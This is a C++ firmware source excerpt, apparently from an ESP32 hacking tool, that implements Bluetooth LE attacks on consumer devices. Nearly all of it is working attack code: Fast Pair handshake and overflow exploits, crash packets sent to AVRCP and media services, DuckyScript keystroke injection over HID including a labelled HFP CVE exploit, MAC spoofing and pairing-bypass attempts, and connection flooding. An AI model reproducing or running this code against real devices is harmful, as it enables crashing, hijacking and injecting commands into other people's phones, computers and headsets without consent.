    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    uint8_t devicePubKey[65];
    bool handshakeOk = performRealHandshake(pKbpChar, devicePubKey);
    bool protocolAttack = sendProtocolAttack(pKbpChar, devicePubKey);
    bool stateAttack = sendStateConfusionAttack(pKbpChar);
    bool cryptoAttack = sendCryptoOverflowAttack(pKbpChar);
    bool crashed = testForVulnerability(pKbpChar);

    pClient->disconnect();
    bleManager.cleanupAfterAttack();
    return (handshakeOk && protocolAttack && crashed) || 
           (stateAttack && crashed) || 
           (cryptoAttack && crashed);
}

bool WhisperPairExploit::executeAdvanced(NimBLEAddress target, int attackType) {
    bleManager.prepareForConnection();
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient, true)) {
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    bool success = false;
    uint8_t devicePubKey[65];

    switch(attackType) {
        case 0:
            if(performRealHandshake(pKbpChar, devicePubKey)) {
                success = sendProtocolAttack(pKbpChar, devicePubKey);
            }
            break;
        case 1:
            success = sendStateConfusionAttack(pKbpChar);
            break;
        case 2:
            success = sendCryptoOverflowAttack(pKbpChar);
            break;
        case 3:
            success = performRealHandshake(pKbpChar, devicePubKey);
            break;
    }

    bool crashed = testForVulnerability(pKbpChar);

    pClient->disconnect();
    bleManager.cleanupAfterAttack();
    return success && crashed;
}

bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
    if(!pClient || !pClient->isConnected()) return false;
    bool anyAttackSuccess = false;

    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    for(auto& service : services) {
        NimBLEUUID uuid = service->getUUID();
        std::string uuidStr = uuid.toString();

        if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) {
            if(attackAVRCP(service)) anyAttackSuccess = true;
        } else if(uuidStr.find("1843") != std::string::npos || uuidStr.find("b4b4") != std::string::npos) {
            if(attackAudioMedia(service)) anyAttackSuccess = true;
        } else if(uuidStr.find("1124") != std::string::npos || uuidStr.find("1125") != std::string::npos) {
            if(attackTelephony(service)) anyAttackSuccess = true;
        } else if(uuidStr.find("1844") != std::string::npos) {
            if(attackAudioMedia(service)) anyAttackSuccess = true;
        }
    }
    return anyAttackSuccess;
}

bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
    if(!avrcpService) return false;
    NimBLERemoteCharacteristic* pChar = nullptr;
    const char* avrcpUuids[] = {
        "b4b40101-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "0000110e-0000-1000-8000-00805f9b34fb",
        "0000110f-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; avrcpUuids[i] != nullptr; i++) {
        pChar = avrcpService->getCharacteristic(NimBLEUUID(avrcpUuids[i]));
        if(pChar && pChar->canWrite()) break;
    }

    if(!pChar) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = avrcpService->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) { pChar = ch; break; }
        }
    }

    if(!pChar) return false;

    uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x00, 0x00};
    bool playSent = pChar->writeValue(playCmd, sizeof(playCmd), true);
    delay(200);

    uint8_t volUpCmd[] = {0x00, 0x44, 0x00, 0x00, 0x00};
    bool volSent = pChar->writeValue(volUpCmd, sizeof(volUpCmd), true);
    delay(200);

    uint8_t oversizedPacket[256];
    memset(oversizedPacket, 0x41, sizeof(oversizedPacket));
    oversizedPacket[0] = 0xFF;
    oversizedPacket[1] = 0xFF;
    bool crashSent = pChar->writeValue(oversizedPacket, sizeof(oversizedPacket), true);
    delay(300);

    uint8_t invalidState[] = {0x00, 0xFF, 0xFF, 0xFF, 0xFF};
    bool stateSent = pChar->writeValue(invalidState, sizeof(invalidState), true);

    return (playSent || volSent || crashSent || stateSent);
}

bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
    if(!mediaService) return false;
    NimBLERemoteCharacteristic* pMediaChar = nullptr;
    const char* mediaUuids[] = {
        "b4b40201-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "00002b01-0000-1000-8000-00805f9b34fb",
        "00002b02-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; mediaUuids[i] != nullptr; i++) {
        pMediaChar = mediaService->getCharacteristic(NimBLEUUID(mediaUuids[i]));
        if(pMediaChar && pMediaChar->canWrite()) break;
    }

    if(!pMediaChar) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = mediaService->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) { pMediaChar = ch; break; }
        }
    }

    if(!pMediaChar) return false;

    uint8_t commands[][5] = {
        {0x01, 0x00, 0x00, 0x00, 0x00},
        {0x02, 0x00, 0x00, 0x00, 0x00},
        {0x03, 0x00, 0x00, 0x00, 0x00},
        {0x04, 0x00, 0x00, 0x00, 0x00},
        {0x05, 0x00, 0x00, 0x00, 0x00},
        {0x06, 0x00, 0x00, 0x00, 0x00},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
    };

    bool anySent = false;
    for(int i = 0; i < 7; i++) {
        bool sent = pMediaChar->writeValue(commands[i], 5, true);
        if(sent) anySent = true;
        delay(150);
    }
    return anySent;
}

bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
    if(!teleService) return false;
    NimBLERemoteCharacteristic* pAlertChar = nullptr;
    const char* alertUuids[] = {
        "00002a43-0000-1000-8000-00805f9b34fb",
        "00002a44-0000-1000-8000-00805f9b34fb",
        "00002a45-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; alertUuids[i] != nullptr; i++) {
        pAlertChar = teleService->getCharacteristic(NimBLEUUID(alertUuids[i]));
        if(pAlertChar && pAlertChar->canWrite()) break;
    }

    if(!pAlertChar) return false;

    uint8_t alertHigh[] = {0x02};
    uint8_t alertMild[] = {0x01};
    uint8_t invalidAlert[] = {0xFF};

    bool alert1 = pAlertChar->writeValue(alertHigh, 1, true);
    delay(300);
    bool alert2 = pAlertChar->writeValue(alertMild, 1, true);
    delay(300);
    bool alert3 = pAlertChar->writeValue(invalidAlert, 1, true);

    return (alert1 || alert2 || alert3);
}

bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) return false;

    bool success = findAndAttackAudioServices(pClient);

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);
    return success;
}

bool AudioAttackService::injectMediaCommands(NimBLEAddress target) {
    return executeAudioAttack(target);
}

bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) return false;

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x110F));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
    for(auto& ch : chars) {
        if(ch->canWrite()) { pChar = ch; break; }
    }

    if(!pChar) {
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    uint8_t crashPacket1[128];
    uint8_t crashPacket2[64];
    uint8_t crashPacket3[256];
    memset(crashPacket1, 0xFF, sizeof(crashPacket1));
    memset(crashPacket2, 0x00, sizeof(crashPacket2));
    memset(crashPacket3, 0x41, sizeof(crashPacket3));

    bool sent1 = pChar->writeValue(crashPacket1, sizeof(crashPacket1), true);
    delay(200);
    bool sent2 = pChar->writeValue(crashPacket2, sizeof(crashPacket2), true);
    delay(200);
    bool sent3 = pChar->writeValue(crashPacket3, sizeof(crashPacket3), true);

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);
    return (sent1 || sent2 || sent3);
}

DuckyScriptEngine::DuckyScriptEngine() : scriptLoaded(false) {}

DuckyScriptEngine::HIDKeycode DuckyScriptEngine::charToKeycode(char c) {
    if(c >= 'a' && c <= 'z') return HIDKeycode{0, (uint8_t)(0x04 + (c - 'a'))};
    if(c >= 'A' && c <= 'Z') return HIDKeycode{0x02, (uint8_t)(0x04 + (c - 'A'))};
    if(c >= '0' && c <= '9') {
        if(c == '0') return HIDKeycode{0, 0x27};
        return HIDKeycode{0, (uint8_t)(0x1E + (c - '1'))};
    }

    switch(c) {
        case ' ': return HIDKeycode{0, 0x2C};
        case '\n': return HIDKeycode{0, 0x28};
        case '\t': return HIDKeycode{0, 0x2B};
        case '!': return HIDKeycode{0x02, 0x1E};
        case '@': return HIDKeycode{0x02, 0x1F};
        case '#': return HIDKeycode{0x02, 0x20};
        case '$': return HIDKeycode{0x02, 0x21};
        case '%': return HIDKeycode{0x02, 0x22};
        case '^': return HIDKeycode{0x02, 0x23};
        case '&': return HIDKeycode{0x02, 0x24};
        case '*': return HIDKeycode{0x02, 0x25};
        case '(': return HIDKeycode{0x02, 0x26};
        case ')': return HIDKeycode{0x02, 0x27};
        case '-': return HIDKeycode{0, 0x2D};
        case '_': return HIDKeycode{0x02, 0x2D};
        case '=': return HIDKeycode{0, 0x2E};
        case '+': return HIDKeycode{0x02, 0x2E};
        case '[': return HIDKeycode{0, 0x2F};
        case '{': return HIDKeycode{0x02, 0x2F};
        case ']': return HIDKeycode{0, 0x30};
        case '}': return HIDKeycode{0x02, 0x30};
        case '\\': return HIDKeycode{0, 0x31};
        case '|': return HIDKeycode{0x02, 0x31};
        case ';': return HIDKeycode{0, 0x33};
        case ':': return HIDKeycode{0x02, 0x33};
        case '\'': return HIDKeycode{0, 0x34};
        case '"': return HIDKeycode{0x02, 0x34};
        case '`': return HIDKeycode{0, 0x35};
        case '~': return HIDKeycode{0x02, 0x35};
        case ',': return HIDKeycode{0, 0x36};
        case '<': return HIDKeycode{0x02, 0x36};
        case '.': return HIDKeycode{0, 0x37};
        case '>': return HIDKeycode{0x02, 0x37};
        case '/': return HIDKeycode{0, 0x38};
        case '?': return HIDKeycode{0x02, 0x38};
        default: return HIDKeycode{0, 0x2C};
    }
}

bool DuckyScriptEngine::parseLine(String line) {
    line.trim();
    if(line.length() == 0 || line.startsWith("//") || line.startsWith("REM")) return true;

    DuckyCommand cmd;
    if(line.startsWith("DELAY ")) {
        cmd.command = "DELAY";
        cmd.parameter = line.substring(6);
        cmd.delay_ms = cmd.parameter.toInt();
        commands.push_back(cmd);
        return true;
    }
    if(line.startsWith("STRING ")) {
        cmd.command = "STRING";
        cmd.parameter = line.substring(7);
        cmd.delay_ms = 0;
        commands.push_back(cmd);
        return true;
    }
    if(line.startsWith("DEFAULT_DELAY ")) {
        cmd.command = "DEFAULT_DELAY";
        cmd.parameter = line.substring(14);
        cmd.delay_ms = cmd.parameter.toInt();
        commands.push_back(cmd);
        return true;
    }
    if(line.startsWith("GUI ")) {
        cmd.command = "GUI";
        cmd.parameter = line.substring(4).charAt(0);
        cmd.delay_ms = 0;
        commands.push_back(cmd);
        return true;
    }
    if(line.startsWith("CTRL-") || line.startsWith("ALT-") || line.startsWith("SHIFT-")) {
        cmd.command = "COMBO";
        cmd.parameter = line;
        cmd.delay_ms = 0;
        commands.push_back(cmd);
        return true;
    }

    if(line == "ENTER") cmd.command = "SPECIAL";
    else if(line == "SPACE") cmd.command = "SPECIAL";
    else if(line == "TAB") cmd.command = "SPECIAL";
    else if(line == "UP") cmd.command = "SPECIAL";
    else if(line == "DOWN") cmd.command = "SPECIAL";
    else if(line == "LEFT") cmd.command = "SPECIAL";
    else if(line == "RIGHT") cmd.command = "SPECIAL";
    else if(line == "DELETE") cmd.command = "SPECIAL";
    else if(line == "HOME") cmd.command = "SPECIAL";
    else if(line == "END") cmd.command = "SPECIAL";
    else if(line == "INSERT") cmd.command = "SPECIAL";
    else if(line == "PAGEUP") cmd.command = "SPECIAL";
    else if(line == "PAGEDOWN") cmd.command = "SPECIAL";
    else if(line == "ESC") cmd.command = "SPECIAL";
    else if(line == "F1") cmd.command = "SPECIAL";
    else if(line == "F2") cmd.command = "SPECIAL";
    else if(line == "F3") cmd.command = "SPECIAL";
    else if(line == "F4") cmd.command = "SPECIAL";
    else if(line == "F5") cmd.command = "SPECIAL";
    else if(line == "F6") cmd.command = "SPECIAL";
    else if(line == "F7") cmd.command = "SPECIAL";
    else if(line == "F8") cmd.command = "SPECIAL";
    else if(line == "F9") cmd.command = "SPECIAL";
    else if(line == "F10") cmd.command = "SPECIAL";
    else if(line == "F11") cmd.command = "SPECIAL";
    else if(line == "F12") cmd.command = "SPECIAL";

    if(cmd.command.length() > 0) {
        cmd.parameter = line;
        commands.push_back(cmd);
        return true;
    }

    cmd.command = "STRING";
    cmd.parameter = line;
    cmd.delay_ms = 0;
    commands.push_back(cmd);
    return true;
}

bool DuckyScriptEngine::loadFromSD(String filename) {
    commands.clear();
    if(!SD.begin()) return false;
    File file = SD.open(filename);
    if(!file) return false;

    while(file.available()) {
        String line = file.readStringUntil('\n');
        if(!parseLine(line)) {
            file.close();
            return false;
        }
    }
    file.close();
    scriptLoaded = true;
    return true;
}

bool DuckyScriptEngine::loadFromString(String script) {
    commands.clear();
    int start = 0;
    int end = script.indexOf('\n');
    while(end != -1) {
        String line = script.substring(start, end);
        if(!parseLine(line)) return false;
        start = end + 1;
        end = script.indexOf('\n', start);
    }
    String line = script.substring(start);
    if(line.length() > 0) {
        if(!parseLine(line)) return false;
    }
    scriptLoaded = true;
    return true;
}

std::vector<DuckyCommand> DuckyScriptEngine::getCommands() {
    return commands;
}

bool DuckyScriptEngine::isLoaded() {
    return scriptLoaded;
}

void DuckyScriptEngine::clear() {
    commands.clear();
    scriptLoaded = false;
}

size_t DuckyScriptEngine::getCommandCount() {
    return commands.size();
}

HIDDuckyService::HIDDuckyService() : defaultDelay(100) {}

bool HIDDuckyService::sendHIDReport(NimBLERemoteCharacteristic* pChar, uint8_t modifier, uint8_t keycode) {
    if(!pChar) return false;
    uint8_t report[8] = {0};
    report[0] = modifier;
    report[2] = keycode;

    bool sent = pChar->writeValue(report, 8, true);
    delay(10);

    uint8_t nullReport[8] = {0};
    pChar->writeValue(nullReport, 8, true);
    delay(10);
    return sent;
}

bool HIDDuckyService::sendString(NimBLERemoteCharacteristic* pChar, const String& str) {
    for(size_t i = 0; i < str.length(); i++) {
        DuckyScriptEngine::HIDKeycode kc = duckyEngine.charToKeycode(str.charAt(i));
        if(!sendHIDReport(pChar, kc.modifier, kc.keycode)) return false;
        delay(30);
    }
    return true;
}

bool HIDDuckyService::sendSpecialKey(NimBLERemoteCharacteristic* pChar, const String& key) {
    uint8_t modifier = 0;
    uint8_t keycode = 0;

    if(key == "ENTER") keycode = 0x28;
    else if(key == "ESC") keycode = 0x29;
    else if(key == "BACKSPACE") keycode = 0x2A;
    else if(key == "TAB") keycode = 0x2B;
    else if(key == "SPACE") keycode = 0x2C;
    else if(key == "UP") keycode = 0x52;
    else if(key == "DOWN") keycode = 0x51;
    else if(key == "LEFT") keycode = 0x50;
    else if(key == "RIGHT") keycode = 0x4F;
    else if(key == "DELETE") keycode = 0x4C;
    else if(key == "HOME") keycode = 0x4A;
    else if(key == "END") keycode = 0x4D;
    else if(key == "INSERT") keycode = 0x49;
    else if(key == "PAGEUP") keycode = 0x4B;
    else if(key == "PAGEDOWN") keycode = 0x4E;
    else if(key == "F1") keycode = 0x3A;
    else if(key == "F2") keycode = 0x3B;
    else if(key == "F3") keycode = 0x3C;
    else if(key == "F4") keycode = 0x3D;
    else if(key == "F5") keycode = 0x3E;
    else if(key == "F6") keycode = 0x3F;
    else if(key == "F7") keycode = 0x40;
    else if(key == "F8") keycode = 0x41;
    else if(key == "F9") keycode = 0x42;
    else if(key == "F10") keycode = 0x43;
    else if(key == "F11") keycode = 0x44;
    else if(key == "F12") keycode = 0x45;

    return sendHIDReport(pChar, modifier, keycode);
}

bool HIDDuckyService::sendComboKey(NimBLERemoteCharacteristic* pChar, const String& combo) {
    uint8_t modifier = 0;
    String keyPart;

    if(combo.startsWith("CTRL-")) {
        modifier |= 0x01;
        keyPart = combo.substring(5);
    } else if(combo.startsWith("ALT-")) {
        modifier |= 0x04;
        keyPart = combo.substring(4);
    } else if(combo.startsWith("SHIFT-")) {
        modifier |= 0x02;
        keyPart = combo.substring(6);
    } else if(combo.startsWith("GUI-")) {
        modifier |= 0x08;
        keyPart = combo.substring(4);
    } else return false;

    if(keyPart.length() == 1) {
        char keyChar = keyPart.charAt(0);
        DuckyScriptEngine::HIDKeycode kc = duckyEngine.charToKeycode(keyChar);
        return sendHIDReport(pChar, modifier, kc.keycode);
    }

    if(keyPart == "a" || keyPart == "A") return sendHIDReport(pChar, modifier, 0x04);
    else if(keyPart == "c" || keyPart == "C") return sendHIDReport(pChar, modifier, 0x06);
    else if(keyPart == "v" || keyPart == "V") return sendHIDReport(pChar, modifier, 0x19);
    else if(keyPart == "x" || keyPart == "X") return sendHIDReport(pChar, modifier, 0x1B);
    else if(keyPart == "z" || keyPart == "Z") return sendHIDReport(pChar, modifier, 0x1D);
    else if(keyPart == "ENTER") return sendHIDReport(pChar, modifier, 0x28);
    else if(keyPart == "ESC") return sendHIDReport(pChar, modifier, 0x29);
    else if(keyPart == "TAB") return sendHIDReport(pChar, modifier, 0x2B);
    else if(keyPart == "SPACE") return sendHIDReport(pChar, modifier, 0x2C);
    else if(keyPart == "DELETE") return sendHIDReport(pChar, modifier, 0x4C);

    return false;
}

bool HIDDuckyService::sendGUIKey(NimBLERemoteCharacteristic* pChar, char key) {
    uint8_t modifier = 0x08;
    DuckyScriptEngine::HIDKeycode kc = duckyEngine.charToKeycode(key);
    return sendHIDReport(pChar, modifier, kc.keycode);
}

bool HIDDuckyService::injectDuckyScript(NimBLEAddress target, String script) {
    if(!duckyEngine.loadFromString(script)) return false;
    
    bool hasHFP = false;
    String deviceName = "";
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                deviceName = scannerData.deviceNames[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    if(hasHFP && !deviceName.isEmpty()) {
        showAttackProgress("Device has HFP, testing vulnerability...", TFT_CYAN);
        HFPExploitEngine hfp;
        if(hfp.testCVE202536911(target)) {
            showAttackProgress("HFP vulnerable! Establishing connection...", TFT_GREEN);
            if(hfp.establishHFPConnection(target)) {
                showAttackProgress("HFP connected, executing script...", TFT_BLUE);
                return executeDuckyScript(target);
            }
        }
        showAttackProgress("HFP failed, trying regular connection...", TFT_ORANGE);
    }
    
    return executeDuckyScript(target);
}

bool HIDDuckyService::injectDuckyScriptFromSD(NimBLEAddress target, String filename) {
    if(!duckyEngine.loadFromSD(filename)) return false;
    return executeDuckyScript(target);
}

bool HIDDuckyService::executeDuckyScript(NimBLEAddress target) {
    if(!duckyEngine.isLoaded()) return false;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return false;
    }

    showAttackProgress("Connected! Finding HID service...", TFT_GREEN);
    NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(!pHIDService) {
        showAttackResult(false, "No HID service found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pReportChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
    for(auto& ch : chars) {
        std::string uuidStr = ch->getUUID().toString();
        if((uuidStr.find("2a4d") != std::string::npos || uuidStr.find("2a22") != std::string::npos || uuidStr.find("2a32") != std::string::npos) && ch->canWrite()) {
            pReportChar = ch;
            break;
        }
    }

    if(!pReportChar) {
        showAttackResult(false, "No writable HID characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    showAttackProgress("Executing Ducky Script...", TFT_BLUE);
    std::vector<DuckyCommand> commands = duckyEngine.getCommands();
    bool success = true;
    int currentDelay = defaultDelay;

    for(size_t i = 0; i < commands.size(); i++) {
        DuckyCommand cmd = commands[i];
        if(i % 5 == 0) showAttackProgress(String("Executing command " + String(i+1) + "/" + String(commands.size())).c_str(), TFT_BLUE);

        if(cmd.command == "DELAY") delay(cmd.delay_ms);
        else if(cmd.command == "DEFAULT_DELAY") currentDelay = cmd.delay_ms;
        else if(cmd.command == "STRING") {
            if(!sendString(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        } else if(cmd.command == "GUI") {
            if(cmd.parameter.length() > 0) {
                if(!sendGUIKey(pReportChar, cmd.parameter.charAt(0))) { success = false; break; }
            }
            delay(currentDelay);
        } else if(cmd.command == "COMBO") {
            if(!sendComboKey(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        } else if(cmd.command == "SPECIAL") {
            if(!sendSpecialKey(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        }
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);

    if(success) showAttackResult(true, "Ducky Script executed!");
    else showAttackResult(false, "Script execution failed");
    return success;
}

bool HIDDuckyService::forceInjectDuckyScript(NimBLEAddress target, String script, const String& deviceName, int rssi) {
    if(!duckyEngine.loadFromString(script)) {
        showAttackResult(false, "Failed to parse script");
        return false;
    }

    HIDExploitEngine hidExploit;
    HIDConnectionResult connResult;

    if(deviceName.isEmpty() || rssi == 0) {
        String dummyName = "Unknown HID Device";
        connResult = hidExploit.forceHIDConnection(target, dummyName, -60);
    } else {
        connResult = hidExploit.forceHIDConnection(target, deviceName, rssi);
    }

    if(!connResult.success) {
        showAttackResult(false, "Failed to establish HID connection");
        return false;
    }

    NimBLEClient* pClient = nullptr;
    String connectionMethod = "";
    pClient = attemptConnectionWithStrategies(target, connectionMethod);

    if(!pClient) {
        showAttackResult(false, "Failed to create client after exploit");
        return false;
    }

    showAttackProgress("Finding HID service...", TFT_GREEN);
    NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(!pHIDService) {
        showAttackResult(false, "No HID service found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pReportChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
    for(auto& ch : chars) {
        std::string uuidStr = ch->getUUID().toString();
        if((uuidStr.find("2a4d") != std::string::npos || uuidStr.find("2a22") != std::string::npos || uuidStr.find("2a32") != std::string::npos) && ch->canWrite()) {
            pReportChar = ch;
            break;
        }
    }

    if(!pReportChar) {
        showAttackResult(false, "No writable HID characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    showAttackProgress("Executing Ducky Script...", TFT_BLUE);
    std::vector<DuckyCommand> commands = duckyEngine.getCommands();
    bool success = true;
    int currentDelay = defaultDelay;

    for(size_t i = 0; i < commands.size(); i++) {
        DuckyCommand cmd = commands[i];

        if(cmd.command == "DELAY") delay(cmd.delay_ms);
        else if(cmd.command == "DEFAULT_DELAY") currentDelay = cmd.delay_ms;
        else if(cmd.command == "STRING") {
            if(!sendString(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        } else if(cmd.command == "GUI") {
            if(cmd.parameter.length() > 0) {
                if(!sendGUIKey(pReportChar, cmd.parameter.charAt(0))) { success = false; break; }
            }
            delay(currentDelay);
        } else if(cmd.command == "COMBO") {
            if(!sendComboKey(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        } else if(cmd.command == "SPECIAL") {
            if(!sendSpecialKey(pReportChar, cmd.parameter)) { success = false; break; }
            delay(currentDelay);
        }
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);

    if(success) {
        showAttackResult(true, "Ducky Script injected!");
    } else {
        showAttackResult(false, "Script injection failed");
    }
    return success;
}

void HIDDuckyService::setDefaultDelay(int delay_ms) {
    defaultDelay = delay_ms;
}

size_t HIDDuckyService::getScriptSize() {
    return duckyEngine.getCommandCount();
}

AuthBypassEngine::AuthBypassEngine() {
    uint8_t defaultKey[16] = {0};
    addKnownDevice("Windows-PC", "AA:BB:CC:DD:EE:FF", defaultKey);
    addKnownDevice("Android-Phone", "11:22:33:44:55:66", defaultKey);
    addKnownDevice("MacBook-Pro", "FF:EE:DD:CC:BB:AA", defaultKey);
}

void AuthBypassEngine::addKnownDevice(const String& name, const String& address, uint8_t linkKey[16]) {
    PairedDevice device;
    device.name = name;
    device.address = address;
    memcpy(device.linkKey, linkKey, 16);
    device.bondedAt = millis();
    knownDevices.push_back(device);
}

String AuthBypassEngine::getSpoofAddress(const String& targetName) {
    for(auto& device : knownDevices) {
        if(targetName.indexOf("Windows") != -1 && device.name.indexOf("Windows") != -1) return device.address;
        if(targetName.indexOf("Android") != -1 && device.name.indexOf("Android") != -1) return device.address;
        if(targetName.indexOf("Mac") != -1 && device.name.indexOf("Mac") != -1) return device.address;
    }
    return "AA:BB:CC:DD:EE:FF";
}

bool AuthBypassEngine::attemptSpoofConnection(NimBLEAddress target, const String& targetName) {
    String spoofAddress = getSpoofAddress(targetName);
    showAttackProgress(String("Spoofing as: " + spoofAddress).c_str(), TFT_CYAN);

    NimBLEDevice::deinit(true);
    delay(500);
    std::string spoofAddrStr = spoofAddress.c_str();
    NimBLEDevice::init(spoofAddrStr);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(true, true, true);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(8);
    pClient->setConnectionParams(12, 12, 0, 400);
    bool connected = pClient->connect(target, true);

    if(connected) {
        showAttackProgress("Spoof connection successful!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool AuthBypassEngine::forceRepairing(NimBLEAddress target) {
    showAttackProgress("Attempting forced re-pairing...", TFT_YELLOW);
    NimBLEDevice::deinit(true);
    delay(500);
    std::string forceName = "Forced-Pair";
    NimBLEDevice::init(forceName);
    NimBLEDevice::setSecurityAuth(false, false, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(10);
    bool connected = pClient->connect(target, false);

    if(connected) {
        showAttackProgress("Forced pairing successful!", TFT_GREEN);
        if(pClient->secureConnection()) showAttackProgress("Bonding established!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool AuthBypassEngine::exploitAuthBypass(NimBLEAddress target) {
    showAttackProgress("Testing authentication bypass...", TFT_ORANGE);
    NimBLEDevice::deinit(true);
    delay(500);
    std::string zeroKeyName = "Zero-Key-Auth";
    NimBLEDevice::init(zeroKeyName);
    NimBLEDevice::setSecurityAuth(true, false, false);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(8);
    bool connected = pClient->connect(target, true);

    if(connected) {
        showAttackProgress("Zero-key auth bypass worked!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    NimBLEDevice::deleteClient(pClient);

    NimBLEDevice::deinit(true);
    delay(500);
    std::string legacyName = "Legacy-Pair";
    NimBLEDevice::init(legacyName);
    NimBLEDevice::setSecurityAuth(false, true, false);

    pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(10);
    connected = pClient->connect(target, true);

    if(connected) {
        showAttackProgress("Legacy pairing bypass worked!", TFT_GREEN);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    NimBLEDevice::deleteClient(pClient);
    return false;
}

MultiConnectionAttack::MultiConnectionAttack() {}
MultiConnectionAttack::~MultiConnectionAttack() { cleanup(); }

bool MultiConnectionAttack::connectionFloodSingle(NimBLEAddress target, int timeout) {
    NimBLEDevice::deinit(true);
    delay(100);
    std::string floodName = "Bruce-Flooder";
    NimBLEDevice::init(floodName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) return false;

    pClient->setConnectTimeout(timeout);
    bool connected = pClient->connect(target, false);

    if(connected) {
        activeConnections.push_back(pClient);
        return true;
    }
    NimBLEDevice::deleteClient(pClient);
    return false;
}

bool MultiConnectionAttack::connectionFlood(std::vector<NimBLEAddress> targets, int attemptsPerTarget) {
    if(!confirmAttack("WARNING: Connection flood may disrupt BLE. Continue?")) return false;
    showAttackProgress("Starting connection flood...", TFT_ORANGE);

    bool anySuccess = false;
    for(int attempt = 0; attempt < attemptsPerTarget; attempt++) {
        showAttackProgress(String("Flood attempt " + String(attempt+1) + "/" + String(attemptsPerTarget)).c_str(), TFT_YELLOW);
        for(auto& target : targets) {
            if(connectionFloodSingle(target, 2)) anySuccess = true;
            delay(50);
        }
    }

    cleanup();
    if(anySuccess) showAttackResult(true, "Connection flood completed");
